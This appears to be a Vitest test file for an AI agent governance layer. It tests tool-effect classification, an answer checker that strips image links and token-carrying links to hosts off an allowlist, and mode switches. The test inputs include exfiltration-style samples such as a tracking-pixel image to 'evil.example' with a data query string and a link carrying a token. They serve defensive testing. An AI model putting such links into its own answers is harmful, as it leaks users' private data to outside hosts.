import { describe, expect, it } from "vitest";
import { parseComponentModes } from "./modes.js";
import { checkAnswer } from "./output-check.js";
import { externalHostInArgs, resolveToolDescriptor } from "./tool-descriptor.js";

describe("resolveToolDescriptor", () => {
  it.each([
    ["read", undefined, {}, { effect: "read", destination: { kind: "internal" }, source: "first_party" }],
    ["bash", undefined, {}, { effect: "execute", source: "first_party" }],
    ["write-memory-file", undefined, {}, { effect: "persist" }],
    ["xyne-claw", undefined, {}, { effect: "publish", destination: { kind: "internal" } }],
    ["spaces-send-message", "xyne-spaces", {}, { effect: "publish", destination: { kind: "internal" }, source: "verb" }],
    ["spaces-message-detail", "xyne-spaces", { writeTool: false }, { effect: "read", source: "verb" }],
    ["get-comment", "acme", {}, { effect: "read" }],
    ["message-user", "slack", {}, { effect: "send" }],
    ["gmail_send_email", "google", {}, { effect: "send", destination: { kind: "untrusted_mcp" } }],
    ["list_pull_requests", "bitbucket", {}, { effect: "read", destination: { kind: "untrusted_mcp" }, returnsPrivateData: false }],
    ["get_messages", "slack", {}, { effect: "read", returnsPrivateData: true }],
    ["delete_issue", "jira", {}, { effect: "delete" }],
    ["frobnicate", "acme", {}, { effect: "unknown", source: "unknown" }],
    ["frobnicate", "acme", { writeTool: true }, { effect: "write", source: "policy" }],
    ["frobnicate", "acme", { writeTool: false }, { effect: "read", source: "policy" }],
    ["widgets", "acme", { description: "Returns every widget in the workspace." }, { effect: "read", source: "description" }],
    ["spaces-messages", "xyne-spaces", { description: "Lists the messages in a channel, newest first" }, { effect: "read", source: "description" }],
    ["digest", "acme", { description: "Sends the daily digest to the channel." }, { effect: "send", source: "description" }],
    ["get-report", "acme", { description: "Generates and sends the report by mail" }, { effect: "send", source: "description" }],
    ["list-messages", "acme", { description: "Messages in the channel" }, { effect: "read", source: "verb" }],
    ["send-message", "acme", { description: "Returns the message it sent" }, { effect: "send", source: "verb" }],
    ["spaces-digest", "xyne-spaces", { writeTool: false, description: "Sends the digest" }, { effect: "read", source: "policy" }],
    ["ask-user-question", undefined, {}, { effect: "read", source: "first_party" }],
    ["todo-write", undefined, {}, { effect: "read" }],
    ["spaces-whoami", "xyne-spaces", {}, { effect: "read", destination: { kind: "internal" } }],
    ["send_mail", "google", { writeTool: false }, { effect: "send" }],
    ["search_docs", "acme", { annotations: { destructiveHint: true } }, { effect: "delete" }],
    ["update_doc", "acme", { annotations: { readOnlyHint: true } }, { effect: "write" }],
    ["fetch_url", "web", { args: { url: "https://evil.example/x" } }, { effect: "read", destination: { kind: "external", host: "evil.example" } }],
    ["list_files", "acme", { trustTier: "trusted" }, { destination: { kind: "internal" } }],
    ["ping", "acme", { annotations: { openWorldHint: true } }, { destination: { kind: "external" } }],
  ] as const)("%s on %s", (toolName, serverType, extra, expected) => {
    expect(resolveToolDescriptor({ toolName, serverType, ...extra })).toMatchObject(expected);
  });

  it("finds the first outbound host in the arguments and skips private addresses", () => {
    expect(externalHostInArgs({ a: "see http://10.0.0.5/x and https://Docs.Example.com/path?q=1" })).toBe("docs.example.com");
    expect(externalHostInArgs({ a: "http://localhost:3000" })).toBeUndefined();
    expect(externalHostInArgs(undefined)).toBeUndefined();
  });
});

describe("checkAnswer", () => {
  const opts = { allowedHosts: ["cdn.example.com"], privateData: false };
  it("removes auto-loading images off the allowlist and keeps everything else", () => {
    const text = "Done ![chart](https://cdn.example.com/c.png) and ![pixel](https://evil.example/p.png?d=abc) <img src=\"https://evil.example/i.png\"> [doc](https://evil.example/doc)";
    const r = checkAnswer(text, opts);
    expect(r.links.map((l) => [l.host, l.reason, l.autoLoads])).toEqual([["evil.example", "host_not_allowed", true], ["evil.example", "host_not_allowed", true]]);
    expect(r.text).toBe("Done ![chart](https://cdn.example.com/c.png) and pixel [image removed] [doc](https://evil.example/doc)");
  });
  it("also removes links that carry data once private data was read", () => {
    const r = checkAnswer("see [doc](https://evil.example/doc?token=abc) and https://evil.example/plain", { ...opts, privateData: true });
    expect(r.links.map((l) => l.reason)).toEqual(["carries_data"]);
    expect(r.text).toBe("see doc and https://evil.example/plain");
  });
  it("returns the input untouched when nothing is found", () => {
    expect(checkAnswer("plain answer", opts)).toEqual({ links: [], text: "plain answer" });
  });
});

describe("parseComponentModes", () => {
  it("defaults to shadow, kill switches to enforce, and lets one component be overridden", () => {
    expect(parseComponentModes({})).toMatchObject({ A: "shadow", C2: "shadow", D: "shadow", kill: "enforce" });
    expect(parseComponentModes({ GOVERNANCE_MODE: "enforce", GOVERNANCE_COMPONENT_MODES: "C2=off, D=bogus" })).toMatchObject({ A: "enforce", C2: "off", D: "enforce" });
    expect(parseComponentModes({ GOVERNANCE_MODE: "nope" }).A).toBe("shadow");
    expect(parseComponentModes({ GOVERNANCE_MODE: "off" }).kill).toBe("off");
    expect(parseComponentModes({ GOVERNANCE_COMPONENT_MODES: "kill=shadow" }).kill).toBe("shadow");
  });
});
